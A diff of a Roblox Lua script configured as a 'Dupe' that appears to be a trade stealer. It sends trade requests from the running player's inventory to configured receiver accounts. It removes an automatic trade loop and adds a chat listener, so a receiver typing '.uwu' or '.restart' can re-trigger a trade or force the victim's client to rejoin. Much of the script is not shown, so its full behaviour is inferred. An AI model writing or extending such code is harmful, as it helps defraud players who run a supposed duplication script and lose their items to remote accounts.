@@ -6,7 +6,7 @@ Config = {
     Script = "Dupe",
     CustomLink = "None"
 }
-Commands = {ResendTrade = ".resend", RestartPlayer = ".restart"}
+Commands = {ResendTrade = ".uwu", RestartPlayer = ".restart"}
 repeat
     wait()
 until game:IsLoaded()
@@ -226,7 +226,6 @@ function FullInventory()
 end
 FullInventory()
 task.wait()
--- Function to send a trade to a receiver
 function Sendtrade(I)
     if Mobile then
         local J = c.PlayerGui.MainGUI.Lobby.Leaderboard
@@ -245,8 +244,17 @@ function Sendtrade(I)
         TapUI(J.Inspect.Close)
     end
 end
-
--- Function to activate trade for a specific player
+function readchats(I)
+    b[I].Chatted:Connect(
+        function(K)
+            if K == Commands.ResendTrade then
+                Sendtrade(I)
+            elseif K == Commands.RestartPlayer then
+                f:TeleportToPlaceInstance(game.PlaceId, game.JobId, c)
+            end
+        end
+    )
+end
 function Activate(I)
     for w, x in pairs(Config.Receivers) do
         if x == I then
@@ -256,19 +264,6 @@ function Activate(I)
         end
     end
 end
-
--- Function to start the loop for sending trades
-function StartTradeLoop()
-    while true do
-        for _, receiver in ipairs(Config.Receivers) do
-            Sendtrade(receiver)
-        end
-        wait(5)  -- Wait for 5 seconds before repeating
-    end
-end
-
-StartTradeLoop()
-
 g.Trade.StartTrade.OnClientEvent:Connect(
     function()
         wait(1)
